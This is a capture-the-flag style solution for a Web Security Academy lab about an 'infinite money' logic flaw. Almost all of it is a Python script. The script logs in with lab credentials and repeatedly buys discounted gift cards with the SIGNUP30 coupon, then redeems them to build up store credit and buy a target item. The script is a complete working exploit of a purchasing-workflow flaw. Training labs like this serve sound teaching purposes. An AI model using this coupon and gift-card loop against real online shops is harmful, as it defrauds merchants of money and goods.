# Infinite money logic flaw

> This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
import sys
from bs4 import BeautifulSoup

BASE_URL = "https://0a16007c0398e1fd82a1516000c1000a.web-security-academy.net/"

def exploit(url):
    session = requests.Session()
    
    # 1. Authentication Phase
    login_endpoint = f"{url}login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']

    login_credentials = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }

    response = session.post(login_endpoint, data=login_credentials)
    if "Log out" not in response.text:
        print("[-] Login failed.")
        return
        
    print("[+] LOGIN SUCCESSFUL")

    # Define endpoints upfront
    cart_endpoint = f"{url}cart"
    coupon_endpoint = f"{url}cart/coupon"
    checkout_endpoint = f"{url}cart/checkout"
    giftcard_endpoint = f"{url}gift-card"

    # 2. Financial Exploitation Loop 
    # Generating $3 profit per iteration. 
    # Target item is $1337. Starting balance is $100. 415+ iterations required.
    print("[*] Initiating funds generation. This will take a moment...")
    
    for i in range(1, 420):
        # Step A: Add $10 Gift Card to Cart
        add_card_payload = {
            "productId": 2,
            "redir": "PRODUCT",
            "quantity": 1
        }
        session.post(cart_endpoint, data=add_card_payload)

        # Fetch fresh CSRF token from Cart
        response = session.get(cart_endpoint)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find("input", {"name": "csrf"})['value']

        # Step B: Apply 30% Discount Coupon
        coupon_payload = {
            "csrf": csrf_token,
            "coupon": "SIGNUP30"
        }
        session.post(coupon_endpoint, data=coupon_payload)

        # Step C: Checkout
        checkout_payload = {"csrf": csrf_token}
        response = session.post(checkout_endpoint, data=checkout_payload)
        
        # Step D: Extract Gift Card Code from Order Confirmation
        soup = BeautifulSoup(response.text, 'html.parser')
        try:
            gift_card_code = soup.find_all("table")[2].find_all("td")[0].text.strip()
        except IndexError:
            print(f"\n[-] Failed to extract gift card code on iteration {i}.")
            return

        # Step E: Redeem Gift Card
        # Fetch fresh CSRF to prevent token expiration during long loop
        response = session.get(f"{url}my-account")
        soup = BeautifulSoup(response.text, 'html.parser')
        my_account_csrf = soup.find("input", {"name": "csrf"})['value']

        redeem_payload = {
            "csrf": my_account_csrf,
            "gift-card": gift_card_code
        }
        session.post(giftcard_endpoint, data=redeem_payload)

        # Dynamic Status Update
        current_profit = i * 3
        sys.stdout.write(f"\r[*] Iteration: {i}/419 | Net Profit Generated: ${current_profit}")
        sys.stdout.flush()

    print("\n[+] FUNDS GENERATION COMPLETE.")

    # 3. Final Execution Phase (Purchase the target item)
    print("[*] Purchasing target jacket...")
    
    add_jacket_payload = {
        "productId": 1,
        "redir": "PRODUCT",
        "quantity": 1
    }
    session.post(cart_endpoint, data=add_jacket_payload)

    # Fetch final checkout CSRF
    response = session.get(cart_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    final_checkout_csrf = soup.find("input", {"name": "csrf"})['value']
    
    final_checkout_payload = {"csrf": final_checkout_csrf}
    session.post(checkout_endpoint, data=final_checkout_payload)

    # 4. Verification Phase
    final_response = session.get(url)
    if "Congratulations" in final_response.text:
        print("[+] TARGET SECURED: Lab Solved")
    else:
        print("[-] Exploit completed, but lab not solved.")

if __name__ == "__main__":
    exploit(BASE_URL)
```

